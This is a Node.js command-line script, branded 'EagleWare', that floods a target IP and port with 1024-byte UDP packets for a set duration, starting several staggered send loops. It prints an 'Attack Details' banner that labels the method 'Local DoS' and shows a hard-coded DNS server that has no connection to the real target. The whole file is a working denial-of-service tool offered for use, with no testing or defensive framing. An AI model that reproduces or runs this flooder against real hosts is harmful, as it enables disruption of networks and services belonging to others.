const dgram = require('dgram');
const { performance } = require('perf_hooks');
const readline = require('readline');

const udpFlood = (targetIp, targetPort, packetSize, duration) => {
    const client = dgram.createSocket('udp4');
    const message = Buffer.alloc(packetSize, 'A');
    
    const endTime = performance.now() + duration * 1000;
    
    const sendPackets = () => {
        if (performance.now() < endTime) {
            client.send(message, 0, message.length, targetPort, targetIp, (err) => {
                if (err) console.error('Send error:', err);
            });
            setImmediate(sendPackets);
        } else {
            client.close();
        }
    };
    
    sendPackets();
};

const centerText = (text, width) => {
    const padding = Math.max(0, Math.floor((width - text.length) / 2));
    return ' '.repeat(padding) + text;
};

const printAttackDetails = (ip, port, threads, time) => {
    const width = process.stdout.columns || 80; 
    const dnsServer = '8.8.8.8'; 

    console.clear();
    console.log(centerText("EagleWare Attack Details", width));
    console.log(centerText("╔════════════════════════════════════════╗", width));
    console.log(centerText(` DNS Server: ${dnsServer}`, width));
    console.log(centerText(` Port: ${port}`, width));
    console.log(centerText(` Size: 1024 bytes`, width));
    console.log(centerText(` Duration: ${time} seconds`, width));
    console.log(centerText(` Method: Local DoS`, width));
    console.log(centerText("╚════════════════════════════════════════╝", width));
    console.log(centerText("Reset your network if internet doesn't work", width));
};

const main = () => {
    const args = process.argv.slice(2);
    if (args.length !== 4) {
        return;
    }
    
    const [ip, port, threads, time] = args;
    
    if (isNaN(port) || isNaN(threads) || isNaN(time)) {
        console.log('Port, threads, and time must be numbers.');
        return;
    }
    
    const portNum = parseInt(port, 10);
    const threadsNum = parseInt(threads, 10);
    const timeNum = parseInt(time, 10);
    
    printAttackDetails(ip, portNum, threadsNum, timeNum);
    
    for (let i = 0; i < threadsNum; i++) {
        setTimeout(() => {
            udpFlood(ip, portNum, 1024, timeNum);
        }, i * 1000);  
    }
};

main();